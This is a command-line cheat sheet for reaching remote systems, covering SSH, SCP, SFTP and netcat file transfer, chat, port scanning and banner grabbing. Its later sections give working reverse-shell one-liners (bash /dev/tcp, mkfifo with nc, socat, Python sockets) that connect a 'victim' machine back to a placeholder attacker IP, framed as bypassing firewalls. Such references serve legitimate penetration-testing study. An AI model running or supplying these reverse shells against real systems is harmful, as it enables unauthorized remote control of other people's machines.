
# Accessing a Remote System via IP Address & CLI

## 1. Connecting to a Remote System Using an IP Address

### a) Secure Shell (SSH) - Best for CLI Access

#### **Service**: OpenSSH

#### **Command:**
```bash
ssh user@remote-ip
```
#### **Example:**
```bash
ssh root@192.168.1.100
```

#### **Install in Linux:**
```bash
sudo apt install openssh-client  # Client
sudo apt install openssh-server  # Server (if you want to allow connections)
```

#### **Install in Termux:**
```bash
pkg install openssh
ssh user@remote-ip
```

### b) Secure Copy (SCP) - Best for File Transfer

#### **Command:**
```bash
scp file.txt user@remote-ip:/path/to/destination
```
#### **Example:**
```bash
scp myfile.txt root@192.168.1.100:/home/root/
```

#### **Install in Linux/Termux:**
```bash
sudo apt install openssh
pkg install openssh  # Termux
```

### c) File Transfer Protocol (FTP) or Secure FTP (SFTP)

#### **Command:**
```bash
sftp user@remote-ip
```
#### **Example:**
```bash
sftp root@192.168.1.100
put file.txt
get file.txt
```

#### **Install:**
```bash
sudo apt install openssh-client  # Linux
pkg install openssh  # Termux
```

### d) Netcat (nc) - Best for Raw Data Transfer

#### **To receive data (on remote system):**
```bash
nc -l -p 1234 > receivedfile.txt
```

#### **To send data (on local system):**
```bash
cat myfile.txt | nc remote-ip 1234
```

#### **Install:**
```bash
sudo apt install netcat
pkg install netcat
```

## 2. Netcat (nc) - Essential Commands

### **Basic Connection (Client-Server Communication)**

#### **Start a Listener (Server):**
```bash
nc -lvp 4444
```
#### **Connect to the Listener (Client):**
```bash
nc <server-ip> 4444
```
#### **Example:**
```bash
nc 192.168.1.100 4444
```

### **File Transfer**
#### **Send a File:**
```bash
nc -w 3 <receiver-ip> 4444 < file.txt
```
#### **Receive a File:**
```bash
nc -lvp 4444 > received.txt
```

### **Chat Between Two Machines**
#### **On Machine 1 (Listener):**
```bash
nc -lvp 1234
```
#### **On Machine 2 (Client):**
```bash
nc <machine1-ip> 1234
```

### **Port Scanning**
```bash
nc -zv <target-ip> 20-100
```

### **Banner Grabbing (Checking Open Ports)**
```bash
nc -nv <target-ip> 80
```
Type:
```bash
HEAD / HTTP/1.1
```
Press Enter twice to check the server response.

### **Reverse Shell (Bypassing Firewall)**
#### **Attacker Machine (Listener):**
```bash
nc -lvp 5555
```
#### **Victim Machine (Connect Back):**
```bash
bash -i >& /dev/tcp/<attacker-ip>/5555 0>&1
```

### **Transfer Files Over UDP**
#### **Send File:**
```bash
nc -u <receiver-ip> 9999 < file.txt
```
#### **Receive File:**
```bash
nc -u -lvp 9999 > received.txt
```

### **Alternative Methods for Reverse Shells**
#### **Using mkfifo:**
```bash
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f
```
#### **Using socat:**
```bash
socat TCP:<attacker-ip>:4444 EXEC:/bin/bash
```
#### **Using Python:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### **Installing netcat-traditional for -e Option**
```bash
apt install netcat-traditional
update-alternatives --set nc /bin/nc.traditional
```
